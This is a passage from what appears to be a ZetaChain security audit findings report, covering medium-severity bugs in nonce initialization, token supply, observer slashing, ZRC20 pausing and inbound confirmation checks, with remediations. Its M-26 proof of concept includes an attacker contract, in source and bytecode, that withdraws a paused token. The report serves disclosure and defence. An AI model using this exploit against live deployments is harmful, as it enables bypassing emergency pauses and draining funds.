Consider filtering out stale gas price votes based on the block height of the vote to prevent lagging gas prices.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/393#issuecomment-1876974178)**

***

## [[M-23] Incorrect genesis initialization of pending nonces](https://github.com/code-423n4/2023-11-zetachain-findings/issues/389)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/389)*

In case a ZetaChain node has been hard-reset or a hard fork is performed, the `x/crosschain` module's `InitGenesis` function will initialize the pending nonces for all external chains to 0, diverging from the real pending, non-zero, nonces. Consequently, assigning the next available transaction nonce to a cctx via the `UpdateNonce` function will error, preventing the cctx from ever being processed.

### Proof of Concept

The `InitGenesis` function in [node/x/crosschain/genesis.go#L12-L73](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/genesis.go#L12-L73) initializes the chain nonces in [lines `39-41`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/genesis.go#L39-L43) from the exported state. These nonces are possibly non-zero as they represent the next available transaction nonce for the chains.

```go
38: // Set all the chain nonces
39: for _, elem := range genState.ChainNoncesList {
40: 	if elem != nil {
41: 		k.SetChainNonces(ctx, *elem)
42: 	}
43: }
```

Additionally, the pending nonces are initialized in [lines 63-64](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/genesis.go#L63-L64), by setting the `NonceLow` and `NonceHigh` to 0.

```go
59: if genState.Tss != nil {
60: 	k.SetTSS(ctx, *genState.Tss)
61: 	for _, chain := range common.DefaultChainsList() {
62: 		k.SetPendingNonces(ctx, types.PendingNonces{
63: ❌			NonceLow:  0,
64: ❌			NonceHigh: 0,
65: 			ChainId:   chain.ChainId,
66: 			Tss:       genState.Tss.TssPubkey,
67: 		})
68: 	}
69: 	for _, elem := range genState.TssHistory {
70: 		k.SetTSSHistory(ctx, elem)
71: 	}
72: }
```

However, as a chain's transaction nonce is most probably non-zero (if there have been previous transactions), the pending nonces are initialized incorrectly.

As a result, the `UpdateNonce` function will error when checking if the `NonceHigh` nonce is equal to the next available `Nonce` in [node/x/crosschain/keeper/cctx_utils.go#L44-L46](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/cctx_utils.go#L44-L46) due to the `p.NonceHigh` being initialized to 0.

```go
44: if p.NonceHigh != int64(nonce.Nonce) {
45: 	return cosmoserrors.Wrap(types.ErrNonceMismatch, fmt.Sprintf("chain_id %d, high nonce %d, current nonce %d", receiveChainID, p.NonceHigh, nonce.Nonce))
46: }
```

Consequently, this error has wide-ranging implications as the `UpdateNonce` function is called in many instances:

1.  Processing EVM transactions via the `PostTxProcessing` hook. Specifically, the `UpdateNonce` function is called in [node/x/crosschain/keeper/evm_hooks.go#L254](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L254) and returns an error. Consequently, the EVM transaction is reverted.
2.  Attempting to refund a failed inbound cctx, see [node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L180](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L180). Consequently, the inbound cctx is aborted without refunding.
3.  Cross-chain messaging, see [node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L228](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L228). As a result, the inbound cross-chain cctx is aborted without refunding the sender or notifying the sender (contract) of the abort.
4.  Refunding a failed outbound cctx, see [node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L194](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L194).
5.  Migrating funds from TSS addresses, see [node/x/crosschain/keeper/msg_migrate_tss_funds.go#L133](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_migrate_tss_funds.go#L133).
6.  Sending a command cctx to whitelist an ERC-20 token on an external chain. See [node/x/crosschain/keeper/msg_server_whitelist_erc20.go#L146](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_whitelist_erc20.go#L146)

In this scenario, there's currently no functionality to recover from this error. The chain's pending nonces can not be adjusted, and the only way to recover from this is by fixing the issue and having the chain's validators update their nodes.

### Test Case

The following simple test case demonstrates that the `NonceHigh` does not reflect the chain's actual nonce:

<details>
  <summary><strong>Test case (click to reveal)</strong></summary>

```diff
diff --git a/repos/node/x/crosschain/genesis_test.go b/repos/node/x/crosschain/genesis_test.go
index 994c83f..c959de1 100644
--- a/repos/node/x/crosschain/genesis_test.go
+++ b/repos/node/x/crosschain/genesis_test.go
@@ -1,6 +1,7 @@
 package crosschain_test

 import (
+	"fmt"
 	"testing"

 	"github.com/stretchr/testify/require"
@@ -12,6 +13,8 @@ import (
 )

 func TestGenesis(t *testing.T) {
+	chainNonce := int64(2)
+
 	genesisState := types.GenesisState{
 		Params: types.DefaultParams(),
 		OutTxTrackerList: []types.OutTxTracker{
@@ -28,7 +31,7 @@ func TestGenesis(t *testing.T) {
 		ChainNoncesList: []*types.ChainNonces{
 			sample.ChainNonces(t, "0"),
 			sample.ChainNonces(t, "1"),
-			sample.ChainNonces(t, "2"),
+			sample.ChainNonces(t, fmt.Sprintf("%d", chainNonce)),
 		},
 		CrossChainTxs: []*types.CrossChainTx{
 			sample.CrossChainTx(t, "0"),
@@ -51,6 +54,10 @@ func TestGenesis(t *testing.T) {
 	k, ctx, _, _ := keepertest.CrosschainKeeper(t)
 	crosschain.InitGenesis(ctx, *k, genesisState)
 	got := crosschain.ExportGenesis(ctx, *k)
+
+	pendingNonces, _ := k.GetPendingNonces(ctx, genesisState.Tss.TssPubkey, genesisState.ChainNoncesList[2].ChainId) // @audit-info 3rd chain with the nonce set to 2
+	require.Equal(t, chainNonce, pendingNonces.NonceHigh)                                                            // @audit-info fails, expected 2, got 0
+
 	require.NotNil(t, got)

 	// Compare genesis after init and export
```

```sh
--- FAIL: TestGenesis (0.01s)
    ./2023-11-zetachain/repos/node/x/crosschain/genesis_test.go:59:
        	Error Trace:	./2023-11-zetachain/repos/node/x/crosschain/genesis_test.go:59
        	Error:      	Not equal:
        	            	expected: 2
        	            	actual  : 0
        	Test:       	TestGenesis
```

**How to run this test case:**

Save git diff to a file in the root named `test.patch` and run with

```
git apply test.patch
cd repos/node
go test -v ./x/crosschain/genesis_test.go --run TestGenesis
```

**Result:**

```
=== RUN   TestGenesis
    genesis_test.go:59:
        	Error Trace:	/Users/bernd/Projects/crypto/audits/c4-2023-11-zetachain/repos/node/x/crosschain/genesis_test.go:59
        	Error:      	Not equal:
        	            	expected: 2
        	            	actual  : 0
        	Test:       	TestGenesis
--- FAIL: TestGenesis (0.01s)
```

</details>

### Recommended mitigation steps

Consider exporting the pending nonces in the [`ExportGenesis` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/genesis.go#L76) and initialize the pending nonces state from it in the [`InitGenesis` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/genesis.go#L12).


**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/389#issuecomment-1876973152)**

***

## [[M-24] Zeta Supply Inflation on Deploy Fungible Gas Coin](https://github.com/code-423n4/2023-11-zetachain-findings/issues/339)
*Submitted by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/339)*

The [Zetachain whitepaper](https://www.zetachain.com/whitepaper.pdf) part 7.3 is titled *Comprehensive Defense Against Arbitrary Minting*. In this section, there are mentioned security protections that ensure that the supply of Zeta remains the same across all chains. Within the zetaclient, there is even [zeta_supply_checker.go](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/zeta_supply_checker.go) to ensure that this is the case. According to whitepaper, the total supply should remain the same across all chains with Ethereum being the home supply location. Finding #1 from the Halborn audit puts this as a clear risk as well.

However, this invariant is not always kept. First, the message `DeployFungibleCoinZRC20` on a gas token creates a pool within `SetupChainGasCoinAndPool`.  When creating this pool, a call to `MintCoins()` on the [bankkeeper](https://github.com/code-423n4/2023-11-zetachain/blob/6a9fdc29ce7e142facfcd6f15a16bf00b659d53b/repos/node/x/fungible/keeper/gas_coin_and_pool.go#L67) is made. This increases the amount of Zeta without destroying it anywhere, resulting in an *inflation* of ZETA tokens. This functionality is only callable by admins when new chains are created, but still breaks an important invariant within the system.

Besides increasing the ZETA tokens, it also creates some amount of the ZRC20 token, which may not exist in the TSS at the time. Having funds that are not backed by anything is very dangerous to do.

### PoC

To run this PoC, do the following:

1.  Copy the code below into `x/fungible/keeper/msg_server_deploy_fungible_coin_zrc20_test.go`
2.  Add `fmt` to the list of imports at the top of the file.
3.  Within the `node` directory of the repo, run the following command: `go test -v ./x/fungible/keeper -run TestMsgServer_IncreaseZetaAmount`.
4.  Notice that the execution leads to an increase of 'azeta' without decreasing it anywhere else. This is shown by the asserts and print statements in the execution of the code.

```golang
func TestMsgServer_IncreaseZetaAmount(t *testing.T) {
	t.Run("Deploy token increases zeta amount", func(t *testing.T) {
		k, ctx, sdkk, zk := keepertest.FungibleKeeper(t)
		msgServer := keeper.NewMsgServerImpl(*k)
		k.GetAuthKeeper().GetModuleAccount(ctx, types.ModuleName)
		admin := sample.AccAddress()
		setAdminPolicies(ctx, zk, admin, observertypes.Policy_Type_group2)
		chainID := getValidChainID(t)

		deploySystemContracts(t, ctx, k, sdkk.EvmKeeper)

		zetaAmountBefore := sdkk.BankKeeper.GetSupply(ctx, "azeta")

		// Deploy a gas token
		_, err := msgServer.DeployFungibleCoinZRC20(ctx, types.NewMsgDeployFungibleCoinZRC20(
			admin,
			sample.EthAddress().Hex(),
			chainID,
			18,
			"ETH",
			"ETH",
			common.CoinType_Gas,
			1000000,
		))
		assert.Equal(t, nil, err) // Call succeeds

		zetaAmountAfter := sdkk.BankKeeper.GetSupply(ctx, "azeta")
		assert.GreaterOrEqual(t, zetaAmountAfter.Amount.Int64(), zetaAmountBefore.Amount.Int64())

        fmt.Println("Supply Zeta Before:", zetaAmountBefore)
        fmt.Println("Supply Zeta After:", zetaAmountAfter)
	})
}
```

### Remediation

To prevent the arbitrary creation of Zeta, funds should be taken from another place. Within the ecosystem, this could be done from any of the other chains, such as Ethereum and others. However, the *easiest* would be to take the funds from the community pool that lives on Zetachain.

This way, no funds are *created* out of thin air. This keeps the important invariant that the Zeta supply always stays the same throughout the entire ecosystem.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/339#issuecomment-1885763042)**

***

## [[M-25] Observer Can Temporarily Halt Chain](https://github.com/code-423n4/2023-11-zetachain-findings/issues/336)
*Submitted by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/336)*

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/hooks.go#L92>

The process for changing the TSS address happens as follows:

1.  Observer is either added or **slashed**. This disables inbound calls and starts the kegen process.
2.  All TSS key holders vote on the TSS key. NOTE: this must be done by manually running a script or restarting the node.
3.  Each TSS key holders votes on the new public key to Zetachain.
4.  The admin calls `MigrateFSSFunds` to the new key. NOTE: this must be done MANUALLY by the admin.
5.  The TSS address must be updated on the connector and ERC20Custody contracts on all of the chains. NOTE: this must be done MANUALLY by the admin.
6.  Inbound transactions must be turned on again. NOTE: this must be done MANUALLY by the admin.

If a single observer gets slashed for any reason, the chain will be halted until steps 2-6 are manually done. Within the endblocker, we can see the code that will disable inbound CCTXs and restart the keygen process if the observer count is mismatched. This happens within the [BeginBlocker](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/abci.go#L28) process of the observer module.

```golang

	if totalObserverCountCurrentBlock == int(lastBlockObserverCount.Count) {
		return
	}

           ... 

	k.DisableInboundOnly(ctx)
	k.SetKeygen(ctx, types.Keygen{BlockNumber: math.MaxInt64})
```

The count changes only when slashing occurs. The slashing happens automatically using the `StakingHooks`. Within the hook `BeforeValidatorSlashed()`, it checks to see if the user is underneath the specified threshold. If that's true, then they will be removed.

```golang

	for _, mapper := range mappers {
               ...
		if  sdk.NewDecFromInt(resultingTokens).LT(obsParams.MinObserverDelegation) {
			mapper.ObserverList = CleanAddressList(mapper.ObserverList, accAddress.String())
			k.SetObserverMapper(ctx, mapper)
		}
	}
```

From the code above, it is clear that an observer going off line from slashing will restart the keygen process and halt the chain. This may happen on accident, such as the server going down from a power outage, or on purpose from a malicious validator.

Considering this requires all TSS voters to perform operations (currently 11 on Ethereum) and the administrator, there are a lot of points of failure here. If this happens, I would guess it would take 12 hours to get everything back into a working state. For a fairly common occurrence, this is a large amount of downtime.

### Remediation

One strategy would to simply remove the observer and keep moving on until a pre-determined date. Since the threshold for all of the keys is 2 out of 3, everyone would keep functioning normally until the change was made.

An additional strategy would be to *automate* this entire process. However, many of these operations are super sensitive, such as migrating admin keys. So, this may be intentional.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/336#issuecomment-1885770508)**

***

## [[M-26] ZRC20 Token Pause Check Bypass](https://github.com/code-423n4/2023-11-zetachain-findings/issues/333)
*Submitted by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/333), also found by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/391)*

Ethermint runs *hooks* after the execution of a transaction. Currently, within the Zetachain setup, there are two modules using hooks: `crosschain` and `fungible`. The crosschain hook processes outgoing calls to `withdraw` for ZRC20 tokens and zeta sends. The fungible module checks to see if the ZRC20 token is paused or not.

When calling into the zEVM from the crosschain module on a cctx, the call is *below* the place where the hooks run; this means that the Ethermint hooks are not triggered. There is a call to `processLogs` from the crosschain module but there is no call to `CheckZRC20Paused()` function. If a token was paused, an attacker could *circumvent* the pausing protection by setting up a smart contract to execute on the `onCrossChainCall()` callback to trigger a withdrawal that should not be possible. The pausing may be used in events once a vulnerability is discovered. So, bypassing this assumed protection could have catastrophic consequences.

### Proof of Concept

The proof of concept is a Cosmos SDK test that accesses the Withdrawal functionality within a CCTX.

1.  Add the following code to the file `x/crosschain/keeper/gas_payment_test.go`.

<details>

```
func TestZRC20PauseBypassTry2(t *testing.T) {

	// Initialize chain enough to use
	k, ctx, sdkk, zk := keepertest.CrosschainKeeper(t)
	msgServer := keeper.NewMsgServerImpl(*k)
	_ = msgServer

	// Set the chain ids we want to use to be valid
	params := observertypes.DefaultParams()
	zk.ObserverKeeper.SetParams(
		ctx, params,
	)

	// Validator setup
	validators := k.StakingKeeper.GetAllValidators(ctx)
	validatorAddress := validators[0].OperatorAddress
	valAddr, _ := sdk.ValAddressFromBech32(validatorAddress)
	addresstmp, err := sdk.AccAddressFromHexUnsafe(hex.EncodeToString(valAddr.Bytes()))
	validatorAddr := addresstmp.String()

	// Add validator to the observer list for voting
	chains := zk.ObserverKeeper.GetParams(ctx).GetSupportedChains()
	fmt.Println(chains)
	for _, chain := range chains {
		zk.ObserverKeeper.SetObserverMapper(ctx, &observertypes.ObserverMapper{
			ObserverChain: chain,
			ObserverList:  []string{validatorAddr},
		})
	}

	k.GetAuthKeeper().GetModuleAccount(ctx, fungibletypes.ModuleName)

	// Set the TSS to a random address for processing
	k.SetTSS(ctx, types.TSS{
		TssPubkey: "zetapub1addwnpepq28c57cvcs0a2htsem5zxr6qnlvq9mzhmm76z3jncsnzz32rclangr2g35p",
	})

	// Setup system contracts on the zEVM
	deploySystemContracts(t, ctx, zk.FungibleKeeper, sdkk.EvmKeeper)

	chainID := getValidEthChainID(t)

	//fmt.Println(systemAddr)
	// https://github.com/code-423n4/2023-11-zetachain/blob/6a9fdc29ce7e142facfcd6f15a16bf00b659d53b/repos/protocol-contracts/contracts/zevm/ZRC20.sol#L236

	/*
		- Deploy ZRC20 contract
		- Pause the contract - https://www.zetachain.com/docs/architecture/modules/fungible/messages/#msgupdatezrc20pausedstatus
		- Deploy attacker contract that will interact with ZRC20 contract
		- Make a CCTX to call this contract
		- Attacker contract triggers event for ZRC20 things. Bypasses pausing.
	*/

	// Deploy a ZRC20 token for use later
	asset := sample.EthAddress().String()
	zrc20Addr, err := k.GetFungibleKeeper().DeployZRC20Contract(
		ctx, "ETH", "ETH", 18, chainID, 1, asset, big.NewInt(1000000000),
	)
	fmt.Println(zrc20Addr, err)

	// Get the coin we just made and pause it.
	zrc20Coin, _ := k.GetFungibleKeeper().GetForeignCoins(ctx, zrc20Addr.String())
	assert.Equal(t, false, zrc20Coin.Paused)
	zrc20Coin.Paused = true // How msgServer pauses it - https://github.com/code-423n4/2023-11-zetachain/blob/2834e3f85b2c7774e97413936018a0814c57d860/repos/node/x/fungible/keeper/msg_server_update_zrc20_paused_status.go#L49
	k.GetFungibleKeeper().SetForeignCoins(ctx, zrc20Coin)
	zrc20Coin, _ = k.GetFungibleKeeper().GetForeignCoins(ctx, zrc20Addr.String())
	assert.Equal(t, true, zrc20Coin.Paused)

	// Setup the gas tokens for a given chain and the price of the gas
	// 	systemAddr, _ := k.GetFungibleKeeper().GetSystemContract(ctx)
	k.GetFungibleKeeper().SetGasPrice(ctx, big.NewInt(chainID), big.NewInt(1))
	k.GetFungibleKeeper().SetGasCoin(ctx, big.NewInt(chainID), zrc20Addr)
	k.SetGasPrice(
		ctx, types.GasPrice{
			ChainId:     chainID,
			MedianIndex: 0,
			Prices:      []uint64{1},
		},
	)

	// Set the chain nonce for the outbound tx
	k.SetChainNonces(ctx, types.ChainNonces{
		Index:   "bsc_mainnet",
		ChainId: 56,
		Nonce:   0,
		// #nosec G701 always positive
		FinalizedHeight: uint64(ctx.BlockHeight()),
	},
	)
	k.SetPendingNonces(ctx, types.PendingNonces{
		NonceLow:  0,
		NonceHigh: 0,
		ChainId:   56,
		Tss:       "zetapub1addwnpepq28c57cvcs0a2htsem5zxr6qnlvq9mzhmm76z3jncsnzz32rclangr2g35p",
	})

	/*
		// Deploy my smart contract. Simply calls the withdraw of a particular ZRC20 contract.
		pragma solidity 0.8.7;

		// https://github.com/code-423n4/2023-11-zetachain/blob/2834e3f85b2c7774e97413936018a0814c57d860/repos/protocol-contracts/contracts/zevm/interfaces/IZRC20.sol
		interface IZRC20 {
		    function totalSupply() external view returns (uint256);
		    function balanceOf(address account) external view returns (uint256);
		    function transfer(address recipient, uint256 amount) external returns (bool);
		    function allowance(address owner, address spender) external view returns (uint256);
		    function approve(address spender, uint256 amount) external returns (bool);
		    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
		    function deposit(address to, uint256 amount) external returns (bool);
		    function withdraw(bytes memory to, uint256 amount) external returns (bool);
		    function withdrawGasFee() external view returns (address, uint256);
		}

		struct zContext {
		    bytes origin;
		    address sender;
		    uint256 chainID;
		}

		interface zContract {
		    function onCrossChainCall(
		        zContext calldata context,
		        address zrc20,
		        uint256 amount,
		        bytes calldata message
		    ) external;
		}

		contract MissingPauseHandling is zContract{

		    IZRC20 token;
		    constructor(address zrc20token){
		        token = IZRC20(zrc20token);
		    }


		    // Trigger the actuall event
		    function onCrossChainCall(
		        zContext calldata context,
		        address zrc20,
		        uint256 amount,
		        bytes calldata message
		    ) external override{
		        token.approve(address(token), 0xFFFFFFFFFFFFFFFFFFFFF);
		        token.withdraw(
		            abi.encodePacked(address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF)), 1
		        );
		    }
		}
	*/
	// My personal defined contract
	AttackerContract := &bind.MetaData{
		ABI: "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"zrc20token\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"components\":[{\"internalType\":\"bytes\",\"name\":\"origin\",\"type\":\"bytes\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"chainID\",\"type\":\"uint256\"}],\"internalType\":\"struct zContext\",\"name\":\"context\",\"type\":\"tuple\"},{\"internalType\":\"address\",\"name\":\"zrc20\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"message\",\"type\":\"bytes\"}],\"name\":\"onCrossChainCall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
		Bin: "0x608060405234801561001057600080fd5b506040516107313803806107318339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600081519050610087816100f1565b92915050565b6000602082840312156100a3576100a26100ec565b5b60006100b184828501610078565b91505092915050565b60006100c5826100cc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6100fa816100ba565b811461010557600080fd5b50565b61061a806101176000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063de43156e14610030575b600080fd5b61004a600480360381019061004591906102ef565b61004c565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360008054906101000a900473ffffffffffffffffffffffffffffffffffffffff166a0fffffffffffffffffffff6040518363ffffffff1660e01b81526004016100d292919061042b565b602060405180830381600087803b1580156100ec57600080fd5b505af1158015610100573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061012491906102c2565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c701262673deadbeefdeadbeefdeadbeefdeadbeefdeadbeef6040516020016101869190610410565b60405160208183030381529060405260016040518363ffffffff1660e01b81526004016101b4929190610454565b602060405180830381600087803b1580156101ce57600080fd5b505af11580156101e2573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061020691906102c2565b505050505050565b60008135905061021d8161059f565b92915050565b600081519050610232816105b6565b92915050565b60008083601f84011261024e5761024d610568565b5b8235905067ffffffffffffffff81111561026b5761026a610563565b5b60208301915083600182028301111561028757610286610572565b5b9250929050565b6000606082840312156102a4576102a361056d565b5b81905092915050565b6000813590506102bc816105cd565b92915050565b6000602082840312156102d8576102d761057c565b5b60006102e684828501610223565b91505092915050565b60008060008060006080868803121561030b5761030a61057c565b5b600086013567ffffffffffffffff81111561032957610328610577565b5b6103358882890161028e565b95505060206103468882890161020e565b9450506040610357888289016102ad565b935050606086013567ffffffffffffffff81111561037857610377610577565b5b61038488828901610238565b92509250509295509295909350565b61039c816104a0565b82525050565b6103b36103ae826104a0565b61053f565b82525050565b60006103c482610484565b6103ce818561048f565b93506103de81856020860161050c565b6103e781610581565b840191505092915050565b6103fb816104e8565b82525050565b61040a816104fa565b82525050565b600061041c82846103a2565b60148201915081905092915050565b60006040820190506104406000830185610393565b61044d60208301846103f2565b9392505050565b6000604082019050818103600083015261046e81856103b9565b905061047d6020830184610401565b9392505050565b600081519050919050565b600082825260208201905092915050565b60006104ab826104be565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006104f3826104de565b9050919050565b6000610505826104de565b9050919050565b60005b8381101561052a57808201518184015260208101905061050f565b83811115610539576000848401525b50505050565b600061054a82610551565b9050919050565b600061055c82610592565b9050919050565b600080fd5b600080fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b60008160601b9050919050565b6105a8816104a0565b81146105b357600080fd5b50565b6105bf816104b2565b81146105ca57600080fd5b50565b6105d6816104de565b81146105e157600080fd5b5056fea26469706673582212201a9a9890e7959663d498b5cd67f81c095c01b6f6f2e4954ba9d7acbcaee5907464736f6c63430008070033",
	}

	//sdkk.EvmKeeper
	attackerContract, err := k.GetFungibleKeeper().DeployContract(ctx, AttackerContract, zrc20Addr)
	fmt.Println("Attacker contact:", attackerContract, err)

	// Trigger the event with a single vote
	msg := &types.MsgVoteOnObservedInboundTx{
		Creator:       validatorAddr,
		Sender:        "0x954598965C2aCdA2885B037561526260764095B8",
		SenderChainId: chainID,
		Receiver:      attackerContract.String(),
		ReceiverChain: 7000,
		Amount:        sdkmath.NewUintFromString("1"),
		Message:       "d97B1de3619ed2c6BEb3860147E30cA8A7dC9891", // TODO - do dynamically - don't hardcode
		InBlockHeight: 1,
		GasLimit:      1000000000,
		CoinType:      1,
		TxOrigin:      "0x954598965C2aCdA2885B037561526260764095B8",
		Asset:         "",
		EventIndex:    1,
	}

	k.GetFungibleKeeper().DepositZRC20(ctx, zrc20Addr, attackerContract, big.NewInt(1000000000))

	// Trigger the call to the zEVM from the contract call
	res, err := msgServer.VoteOnObservedInboundTx(
		ctx,
		msg,
	)

	fmt.Println(res, err)

	// Look at outbound tx's
	cctxs := k.GetAllCrossChainTx(ctx)
	fmt.Println(cctxs[0])

}

```
</details>

2.  Run the following command to run this test:

```

    go test ./x/crosschain/keeper/gas_payment_test.go -run TestZRC20PauseBypassTry2 -v
```

3.  Notice that the zEVM call succeeds even though the ZRC20 token is paused.

### Short Term Remediation

Add in the following code for user facing zEVM calls. For instance, `evm_deposit.go` should check whether or not the token was paused.

```go
callReceipt := &ethtypes.Receipt{
    Logs: logs,
}
err = k.fungibleKeeper.CheckPausedZRC20(ctx, callReceipt)
if err != nil {
    return false, errors.Wrap(types.ErrCannotProcessWithdrawal, err.Error())
}
```
### Long Term Remediation

The pausing check is currently happening after a zEVM call via hooks and not in the contract itself. Having *use* before a *check* is considered bad practice, since extra computation occurs. In this case, it appears that the added complexity having this check not in the smart contract led to the vulnerability.

Adding the pausing functionality to the smart contract makes it less complex and more visible to everyone involved. It is recommended to do this.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/333#issuecomment-1876961961)**

**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/333#issuecomment-1880155080):**
 > I think this should be downgraded to Medium based on the C4 categorizations. As as I understand it currently, it doesn't lead to a direct loss of funds.

***

## [[M-27] Inbound Tx Confirmation Bypass via Malicious Observer ](https://github.com/code-423n4/2023-11-zetachain-findings/issues/326)
*Submitted by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/326), also found by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/337)*

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L144> 

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L179> 

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L213> 

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L71>

When utilizing state from multiple blockchains, it is important that this information is **finalized**. If not, a *block reorganization* can occur. This is possible since some subset of nodes may have one chain but the other set will have another. When this happens, a double spend can occur. For instance, if node set A includes the transaction and is processed as the event occurring but then a block reorganization occurs going to node set B that does NOT include a transaction, then the funds were processed prematurely. Now, the user has funds in both locations. For more on this, read the post by [Halborn](https://www.halborn.com/blog/post/double-spends-vs-blockchain-reorgs). This finding is similar to the `Outbound Block confirmation check missing` but is different because there are in separate sections of code and one is outbound while the other is inbound (this one).

Zetachain has set amount of blocks that it must observe to be completed before it will be confirmed that a block occurred or not. After this threshold of new blocks has been met, it is presumed that no block reorganization will occur. In previous audits, the Bitcoin confirmation count was too low, leading to potential of double spend issues. When processing incoming transaction through the normal event handling, Zetachain verifies that enough blocks have passed.

It is possible to *bypass* the confirmation protection by using the `InTxTracker` functionality. The confirmation checks are completely missing for both Ethereum and Bitcoin clients when performing these event checks. Directly after seeing the event in the TxTracker queue, the events will be queried from the blockchain without verifying the amount of blocks that have passed. The regular event handling and TxTracker processing are implemented completely separately, even though they are very similar in nature.

To exploit this, the attacker must be an observer. This is because untrusted relayers must add in a proof, which requires the header to be at a certain point. In particular, the confirmation check is respected on the block header voting. However, an observer does not have to provide a proof; they can simply provide by TxHash and it will be added to the functionality. The observers are somewhat trusted entities but this is still a decentralized system. A malicious or compromised observer should not be able to forgo the confirmation checks entirely to lead the environment vulnerable to a double spend attack.

The result of this is that a malicious observer/compromised node could see a *fork* happening, add this to the Tracker, then profit from the reorganization that happens later. This would duplicate the funds; once on the specified destination from the CCTX and one in the owners wallet. Practically exploiting this is difficult though.

### Proof of Concept

Actually implementing an exploit that causes a double spend by a block reorganization is extremely difficult to do in a test environment. As a result, we deemed that a sufficient way to write a proof of concept for this is to demonstrate that the CCTXs are being operated on even though not enough blocks have been passed. From this, it is easy to deduce that a block reorganization would result in stolen funds.

To prepare for the exploit, do the following:

*   Setup the Zetachain test environment. Instructions can be found at [https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/contrib/localnet/README.md](here).
